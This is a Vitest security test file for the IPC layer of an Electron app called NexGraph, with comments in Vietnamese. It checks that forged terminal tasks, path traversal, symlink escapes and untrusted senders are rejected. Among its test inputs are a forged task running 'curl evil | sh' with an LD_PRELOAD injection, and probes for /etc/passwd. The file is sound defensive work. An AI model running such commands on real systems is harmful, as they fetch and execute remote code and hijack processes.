// Test bảo mật IPC: mọi handler nhận path phải suy gốc từ projectId đã đăng ký trong main.
import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, readFileSync, symlinkSync, truncateSync, unlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { beforeAll, describe, expect, it, vi } from 'vitest'
import type { NexGraphApi } from '../src/shared/api'

const h = vi.hoisted(() => ({
  handlers: new Map<string, (event: unknown, ...args: unknown[]) => Promise<unknown>>(),
  exposed: null as [string, unknown] | null,
  projects: [] as { project_id: string; path: string }[],
  exports: [] as unknown[][],
  mcpStarts: [] as [string, string][],
  watcherRoots: [] as string[],
  terminals: [] as { root: string; cols: number; rows: number; task?: { label: string; command: string } }[],
  userData: '',
  window: null as unknown,
  showOpenDialog: vi.fn(async () => ({ canceled: false, filePaths: [] as string[] })),
  showSaveDialog: vi.fn(async () => ({ canceled: true }) as { canceled: boolean; filePath?: string }),
  showItemInFolder: vi.fn(async (_path: string) => {}),
  rebuildMenu: vi.fn()
}))

vi.mock('electron', () => ({
  app: { getPath: (name: string) => (name === 'userData' ? h.userData : '/tmp') },
  ipcMain: { handle: (channel: string, fn: (event: unknown, ...args: unknown[]) => Promise<unknown>) => { h.handlers.set(channel, fn) } },
  contextBridge: { exposeInMainWorld: (name: string, api: unknown) => { h.exposed = [name, api] } },
  ipcRenderer: { invoke: (channel: string, ...args: unknown[]) => h.handlers.get(channel)!({}, ...args) },
  dialog: { showOpenDialog: h.showOpenDialog, showSaveDialog: h.showSaveDialog },
  BrowserWindow: { fromWebContents: () => ({ isDestroyed: () => false }) },
  shell: { showItemInFolder: h.showItemInFolder },
  safeStorage: { isEncryptionAvailable: () => false, encryptString: (s: string) => Buffer.from(s), decryptString: (b: Buffer) => b.toString() }
}))

vi.mock('../src/main/engine/api', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/main/engine/api')>()
  class FakeEngineApi {
    listProjects() { return h.projects }
    exportGraph(...args: unknown[]) { h.exports.push(args); return { files: [join(args.at(-1) as string, 'a.html')], truncated: false } }
  }
  return { ...actual, EngineApi: FakeEngineApi }
})

vi.mock('../src/main/mcp-http', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/main/mcp-http')>()
  class FakeMcpHttpManager {
    start(pid: string, projectPath: string) { h.mcpStarts.push([pid, projectPath]); return Promise.resolve({ url: 'http://127.0.0.1:1/mcp', key: 'k' }) }
    stop() { return Promise.resolve() }
    stopAll() { return Promise.resolve() }
    status() { return null }
  }
  return { ...actual, McpHttpManager: FakeMcpHttpManager }
})

vi.mock('../src/main/watch/project-watcher', () => ({
  ProjectWatcher: class {
    constructor(o: { root: string }) { h.watcherRoots.push(o.root) }
    start() {}
    stop() {}
  }
}))

// REV-13: thay TerminalManager thật để kiểm đường cấp task mà không spawn pty trong test.
vi.mock('../src/main/terminal/manager', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../src/main/terminal/manager')>()
  class FakeTerminalManager {
    create(root: string, cols: number, rows: number, task?: { label: string; command: string }) {
      h.terminals.push({ root, cols, rows, ...(task ? { task } : {}) })
      return { id: 1, shell: 'fake-shell', cwd: root }
    }
    write() {}
    resize() {}
    kill() {}
  }
  return { ...actual, TerminalManager: FakeTerminalManager }
})

import { registerIpc } from '../src/main/ipc'
import '../src/preload/index'

type Result<T = unknown> = { ok: true; data: T } | { ok: false; error: { code: string; message: string } }
const invoke = (channel: string, ...args: unknown[]): Promise<Result> => {
  const fn = h.handlers.get(channel)
  if (!fn) throw new Error(`Thiếu handler ${channel}`)
  return fn({}, ...args) as Promise<Result>
}
const dataOf = <T,>(r: Result): T => (r as { ok: true; data: T }).data
/** Kênh mới kiểm khung gửi: event giả của khung chính một cửa sổ app. */
const mainFrame = {}
const appEvent = { sender: { mainFrame }, senderFrame: mainFrame }
const invokeAs = (event: unknown, channel: string, ...args: unknown[]): Promise<Result> => {
  const fn = h.handlers.get(channel)
  if (!fn) throw new Error(`Thiếu handler ${channel}`)
  return fn(event, ...args) as Promise<Result>
}

let root: string
let root2: string
let exportDir: string

beforeAll(() => {
  const base = mkdtempSync(join(tmpdir(), 'ng-ipc-sec-'))
  root = join(base, 'proj')
  root2 = join(base, 'proj2')
  exportDir = join(base, 'export')
  h.userData = join(base, 'user-data')
  for (const dir of [root, root2, exportDir, h.userData]) mkdirSync(dir, { recursive: true })
  execFileSync('git', ['init', '-q', root])
  writeFileSync(join(root, 'a.ts'), 'x')
  // Task khai trong dự án: REV-13 chỉ cấp chữ ký cho đúng nội dung này.
  mkdirSync(join(root, '.nexgraph'), { recursive: true })
  writeFileSync(join(root, '.nexgraph', 'tasks.json'), JSON.stringify([
    { label: 'build', command: 'echo', args: ['ok'], type: 'process' }
  ]))
  h.projects = [{ project_id: 'p1', path: root }, { project_id: 'p2', path: root2 }]
  registerIpc(() => ({ baseUrl: 'http://127.0.0.1:1', token: 't' }) as never, () => h.window as never, () => ({ command: 'engine', args: [], cwd: base }), base, undefined, () => {}, h.rebuildMenu)
})

describe('IPC: path thô từ renderer bị từ chối', () => {
  it('watch:start với projectId lạ → unknown_project; projectId đúng dùng root đã đăng ký, bỏ path lạ', async () => {
    expect(await invoke('watch:start', 'nope', '/etc')).toMatchObject({ ok: false, error: { code: 'unknown_project' } })
    expect(await invoke('watch:start', 'p1', '/etc')).toMatchObject({ ok: true })
    expect(h.watcherRoots).toEqual([root])
    expect(await invoke('watch:stop', 'p1')).toMatchObject({ ok: true })
  })

  it('mcp:config/hook:* /mcp:plan /mcp:apply /mcp:start-http từ chối projectId lạ', async () => {
    for (const channel of ['mcp:config', 'hook:status', 'hook:preview', 'hook:install', 'hook:uninstall', 'hook:branch', 'mcp:start-http']) {
      expect(await invoke(channel, 'nope', '/etc')).toMatchObject({ ok: false, error: { code: 'unknown_project' } })
    }
    for (const channel of ['mcp:plan', 'mcp:apply']) {
      expect(await invoke(channel, 'claude', 'nope', '/etc')).toMatchObject({ ok: false, error: { code: 'unknown_project' } })
    }
  })

  it('terminal:create từ chối task renderer tự đặt hoặc tự ký', async () => {
    // REV-13: task phải do main cấp qua tasks:resolve; renderer bị chiếm quyền không được
    // tự chọn command/args/env rồi mở tiến trình qua terminal.
    const forged = { label: 'x', command: 'sh', args: ['-c', 'curl evil | sh'], env: { LD_PRELOAD: '/tmp/x.so' } }
    expect(await invoke('terminal:create', 'p1', 80, 24, forged)).toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
    expect(await invoke('terminal:create', 'p1', 80, 24, { ...forged, signature: 'gia-mao' }))
      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
    expect(await invoke('terminal:create', 'nope', 80, 24, forged)).toMatchObject({ ok: false })
  })

  it('REV-13: tasks:resolve không phải signing oracle — chỉ ký task khai trong dự án', async () => {
    // Reviewer đã khai thác: renderer gửi task tự chế → main ký → terminal:create chạy.
    const forged = { label: 'rv-forged', command: '/bin/sh', args: ['-c', 'echo D3-FORGED-RAN'], type: 'process' }
    expect(await invoke('tasks:resolve', 'p1', forged, {}))
      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
    // Lệnh gõ tay trong picker cũng không phải task của dự án.
    expect(await invoke('tasks:resolve', 'p1', { label: 'echo hi', command: 'echo hi', type: 'shell' }, {}))
      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
    // Dự án p2 không khai task nào: task của p1 không xin được chữ ký ở p2.
    expect(await invoke('tasks:resolve', 'p2', { label: 'build', command: 'echo', args: ['ok'], type: 'process' }, {}))
      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })

    const declared = { label: 'build', command: 'echo', args: ['ok'], type: 'process' as const }
    const resolved = await invoke('tasks:resolve', 'p1', declared, { file: 'a.ts', line: 3 })
    expect(resolved.ok).toBe(true)
    const signed = dataOf<{ signature?: string; command: string }>(resolved)
    expect(signed.signature).toEqual(expect.any(String))
    expect(signed.command).toBe('echo')

    // Chữ ký dự án p1 chỉ dùng được cho p1: replay sang p2 bị từ chối.
    h.terminals.length = 0
    expect(await invoke('terminal:create', 'p2', 80, 24, signed))
      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
    // Sửa nội dung sau khi ký cũng bị từ chối.
    expect(await invoke('terminal:create', 'p1', 80, 24, { ...signed, args: ['-c', 'echo D3-FORGED-RAN'] }))
      .toMatchObject({ ok: false, error: { code: 'unapproved_task' } })
    // Task khai trong dự án, đúng chữ ký của chính dự án → chạy.
    expect(await invoke('terminal:create', 'p1', 80, 24, signed)).toMatchObject({ ok: true })
    expect(h.terminals.at(-1)).toMatchObject({ root, cols: 80, rows: 24, task: { label: 'build', command: 'echo' } })
  })

  it('mcp:config và mcp:plan bỏ path lạ, dùng root thật của projectId', async () => {
    const cfg = await invoke('mcp:config', 'p1', '/etc/evil')
    expect(cfg.ok).toBe(true)
    // So trên giá trị đã parse: trên Windows JSON.stringify nhân đôi dấu '\', so chuỗi thô sẽ sai.
    const stdio = JSON.parse(dataOf<{ stdio: string }>(cfg).stdio) as { mcpServers: { nexgraph: { args: string[] } } }
    expect(stdio.mcpServers.nexgraph.args).toContain(root)
    expect(dataOf<{ stdio: string }>(cfg).stdio).not.toContain('/etc/evil')
    const plan = await invoke('mcp:plan', 'codex', 'p1', '/etc/evil')
    expect(plan.ok).toBe(true)
    expect(dataOf<{ path: string }[]>(plan)[0].path.endsWith(join('.codex', 'config.toml'))).toBe(true)
    expect(await invoke('mcp:plan', '__proto__', 'p1')).toMatchObject({ ok: false })
    await invoke('hook:install', 'p1', '/etc/evil')
    expect(dataOf<string>(await invoke('hook:status', 'p1'))).toBe('on')
    expect(await invoke('mcp:start-http', 'p1', '/etc/evil')).toMatchObject({ ok: true })
    expect(h.mcpStarts.at(-1)).toEqual(['p1', root])
  })
})

describe('IPC: đọc tệp nhị phân trong dự án', () => {
  it('preload chuyển yêu cầu và lỗi qua IPC', async () => {
    expect(h.exposed?.[0]).toBe('nexgraph')
    const api = h.exposed?.[1] as NexGraphApi
    writeFileSync(join(root, 'binary-bridge.png'), Buffer.from([0x00, 0xff, 0x80]))
    expect(await api.fs.readBinary!('p1', 'binary-bridge.png')).toEqual({ data: 'AP+A', size: 3 })
    await expect(api.fs.readBinary!('nope', 'binary-bridge.png'))
      .rejects.toMatchObject({ code: 'unknown_project' })
  })

  it('trả byte gốc dưới dạng base64 và chọn đúng gốc theo projectId', async () => {
    writeFileSync(join(root, 'binary.png'), Buffer.from([0x00, 0x89, 0xff, 0x0a]))
    writeFileSync(join(root2, 'binary.png'), Buffer.from([0xff]))
    writeFileSync(join(root, 'empty.png'), '')
    expect(await invoke('fs:read-binary', 'p1', 'binary.png')).toEqual({
      ok: true, data: { data: 'AIn/Cg==', size: 4 }
    })
    expect(await invoke('fs:read-binary', 'p2', 'binary.png')).toEqual({
      ok: true, data: { data: '/w==', size: 1 }
    })
    expect(await invoke('fs:read-binary', 'p1', 'empty.png')).toEqual({
      ok: true, data: { data: '', size: 0 }
    })
    expect(await invoke('fs:read-binary', 'p1', 'missing.png'))
      .toMatchObject({ ok: false, error: { code: 'file_not_found' } })
  })

  it('từ chối project lạ, đường dẫn ngoài và đường dẫn được bảo vệ kể cả qua symlink', async () => {
    const protectedDir = join(root, '.nexgraph')
    mkdirSync(protectedDir, { recursive: true })
    writeFileSync(join(protectedDir, 'secret.png'), 'secret')
    symlinkSync(root2, join(root, 'binary-outside'), process.platform === 'win32' ? 'junction' : 'dir')
    symlinkSync(protectedDir, join(root, 'binary-secret'), process.platform === 'win32' ? 'junction' : 'dir')
    expect(await invoke('fs:read-binary', 'nope', 'binary.png'))
      .toMatchObject({ ok: false, error: { code: 'unknown_project' } })
    for (const path of ['../proj2/binary.png', join(root2, 'binary.png'), 'binary-outside/binary.png']) {
      expect(await invoke('fs:read-binary', 'p1', path))
        .toMatchObject({ ok: false, error: { code: 'outside_project' } })
    }
    for (const path of ['.nexgraph/secret.png', '.env', 'binary-secret/secret.png']) {
      expect(await invoke('fs:read-binary', 'p1', path))
        .toMatchObject({ ok: false, error: { code: 'protected_path' } })
    }
  })

  it('chấp nhận đúng 50 MiB và từ chối tệp lớn hơn', async () => {
    const path = join(root, 'binary-limit.png')
    writeFileSync(path, '')
    try {
      truncateSync(path, 50 * 1024 * 1024)
      const result = await invoke('fs:read-binary', 'p1', 'binary-limit.png')
      expect(result.ok).toBe(true)
      const binary = dataOf<{ data: string; size: number }>(result)
      expect(binary.size).toBe(50 * 1024 * 1024)
      expect(binary.data).toHaveLength(69905068)
      expect(binary.data.startsWith('AAAA')).toBe(true)
      expect(binary.data.endsWith('AAA=')).toBe(true)
      truncateSync(path, 50 * 1024 * 1024 + 1)
      expect(await invoke('fs:read-binary', 'p1', 'binary-limit.png'))
        .toMatchObject({ ok: false, error: { code: 'too_large' } })
    } finally {
      unlinkSync(path)
    }
  }, 15000)
})

it('fs:write yêu cầu phiên bản tệp và giữ thay đổi mới trên đĩa khi nhận bản cũ', async () => {
  const name = 'versioned.ts'
  const path = join(root, name)
  const format = { eol: '\n', bom: false }
  writeFileSync(path, 'bản gốc')
  const { version } = dataOf<{ version: string }>(await invoke('fs:read', 'p1', name))
  expect(version).toBeTruthy()
  const creation = await invoke('fs:write', 'p1', name, 'ghi đè', { ...format, expectedVersion: null })
  const unversioned = await invoke('fs:write', 'p1', name, 'ghi đè', format)
  expect(creation).toMatchObject({ ok: false, error: { code: 'conflict' } })
  expect(unversioned).toMatchObject({ ok: false, error: { code: 'conflict' } })
  writeFileSync(path, 'bản trên đĩa')
  const stale = await invoke('fs:write', 'p1', name, 'ghi đè', { ...format, expectedVersion: version })
  expect(stale).toMatchObject({ ok: false, error: { code: 'conflict' } })
  expect(readFileSync(path, 'utf8')).toBe('bản trên đĩa')
})

describe('IPC: xuất chỉ dùng thư mục đã chọn trong main', () => {
  it('export:run bỏ outDir lạ; reveal chỉ cho path trong gốc dự án hoặc thư mục xuất', async () => {
    h.showOpenDialog.mockResolvedValueOnce({ canceled: false, filePaths: [exportDir] })
    expect(await invoke('export:pick-dir', 'p1', '/etc/evil')).toMatchObject({ ok: true, data: exportDir })
    expect(await invoke('export:run', 'p1', 'html', { kind: 'all' }, '/etc/evil')).toMatchObject({ ok: true })
    expect(h.exports.at(-1)).toEqual(['p1', 'html', { kind: 'all' }, exportDir])
    expect(await invoke('export:run', 'p2', 'html', { kind: 'all' })).toMatchObject({ ok: false, error: { code: 'bad_param' } })
    expect(await invoke('export:reveal', 'p1', join(exportDir, 'a.html'))).toMatchObject({ ok: true })
    expect(await invoke('export:reveal', 'p1', join(root, 'a.ts'))).toMatchObject({ ok: true })
    expect(await invoke('export:reveal', 'p1', '/etc/passwd')).toMatchObject({ ok: false, error: { code: 'outside_project' } })
    expect(await invoke('export:reveal', 'nope', '/etc/passwd')).toMatchObject({ ok: false, error: { code: 'unknown_project' } })
    expect(h.showItemInFolder).toHaveBeenCalledTimes(2)
  })

  it('giữ tùy chọn đổi trong lúc hộp chọn thư mục xuất còn mở', async () => {
    let choose!: (result: { canceled: boolean; filePaths: string[] }) => void
    let opened!: () => void
    const opening = new Promise<void>((resolve) => { opened = resolve })
    h.showOpenDialog.mockImplementationOnce(() => new Promise((resolve) => {
      choose = resolve
      opened()
    }))
    const picking = invoke('export:pick-dir', 'p1')
    await opening
    const prefs = join(h.userData, 'prefs.json')
    writeFileSync(prefs, JSON.stringify({ aiSelectedModel: { provider: 'example', id: 'm1' } }))
    choose({ canceled: false, filePaths: [exportDir] })
    expect(await picking).toMatchObject({ ok: true, data: exportDir })
    expect(JSON.parse(readFileSync(prefs, 'utf8'))).toEqual({
      aiSelectedModel: { provider: 'example', id: 'm1' },
      'exportDir:p1': exportDir
    })
  })

  it('export:png nhớ thư mục xuất theo dự án, chưa lưu thì về Downloads', async () => {
    h.window = { webContents: { capturePage: vi.fn(async () => ({ toPNG: () => new Uint8Array() })), send: vi.fn() } }
    h.showOpenDialog.mockResolvedValueOnce({ canceled: false, filePaths: [exportDir] })
    expect(await invoke('export:pick-dir', 'p1')).toMatchObject({ ok: true, data: exportDir })
    h.showSaveDialog.mockResolvedValueOnce({ canceled: true })
    expect(await invoke('export:png', 'p1', { x: 1, y: 2, width: 3, height: 4 })).toMatchObject({ ok: true, data: null })
    expect(h.showSaveDialog).toHaveBeenLastCalledWith(h.window, expect.objectContaining({ defaultPath: join(exportDir, 'nexgraph.png') }))
    h.showSaveDialog.mockResolvedValueOnce({ canceled: true })
    expect(await invoke('export:png', 'p2', { x: 1, y: 2, width: 3, height: 4 })).toMatchObject({ ok: true, data: null })
    expect(h.showSaveDialog).toHaveBeenLastCalledWith(h.window, expect.objectContaining({ defaultPath: join('/tmp', 'nexgraph.png') }))
  })
})

describe('menu hệ thống (PR #49): IPC ngôn ngữ và chọn tệp', () => {
  it('app-menu:set-locale chỉ nhận vi/en, mã lạ bị từ chối', async () => {
    expect(await invokeAs(appEvent, 'app-menu:set-locale', 'fr')).toMatchObject({ ok: false, error: { code: 'bad_locale' } })
    expect(await invokeAs(appEvent, 'app-menu:set-locale', null)).toMatchObject({ ok: false, error: { code: 'bad_locale' } })
    expect(h.rebuildMenu).not.toHaveBeenCalled()
    expect(await invokeAs(appEvent, 'app-menu:set-locale', 'en')).toMatchObject({ ok: true })
    expect(h.rebuildMenu).toHaveBeenCalledWith('en')
  })

  it('file:pick-open chỉ trả đường dẫn từ hộp thoại; relative chỉ khi nằm trong dự án', async () => {
    h.showOpenDialog.mockResolvedValueOnce({ canceled: false, filePaths: [join(root, 'a.ts')] })
    expect(await invokeAs(appEvent, 'file:pick-open', 'p1')).toMatchObject({ ok: true, data: { path: join(root, 'a.ts'), relative: 'a.ts' } })
    // Tệp ngoài dự án vẫn mở được (người dùng tự chọn trong hộp thoại) nhưng không có relative.
    h.showOpenDialog.mockResolvedValueOnce({ canceled: false, filePaths: ['/etc/passwd'] })
    const outside = await invokeAs(appEvent, 'file:pick-open', 'p1')
    expect(outside).toMatchObject({ ok: true, data: { path: '/etc/passwd' } })
    expect(dataOf<{ relative?: string }>(outside).relative).toBeUndefined()
    // projectId lạ: không suy được root nên chỉ trả path, không lỗi.
    h.showOpenDialog.mockResolvedValueOnce({ canceled: false, filePaths: ['/etc/hosts'] })
    expect(await invokeAs(appEvent, 'file:pick-open', 'nope')).toMatchObject({ ok: true, data: { path: '/etc/hosts' } })
    h.showOpenDialog.mockResolvedValueOnce({ canceled: true, filePaths: [] })
    expect(await invokeAs(appEvent, 'file:pick-open')).toMatchObject({ ok: true, data: null })
  })

  it('kênh mới từ chối event không phải khung chính của cửa sổ app', async () => {
    for (const channel of ['app-menu:set-locale', 'file:pick-open', 'window:open-new']) {
      expect(await invokeAs({}, channel, 'en')).toMatchObject({ ok: false, error: { code: 'forbidden_sender' } })
      expect(await invokeAs({ sender: { mainFrame }, senderFrame: {} }, channel, 'en'))
        .toMatchObject({ ok: false, error: { code: 'forbidden_sender' } })
    }
  })
})
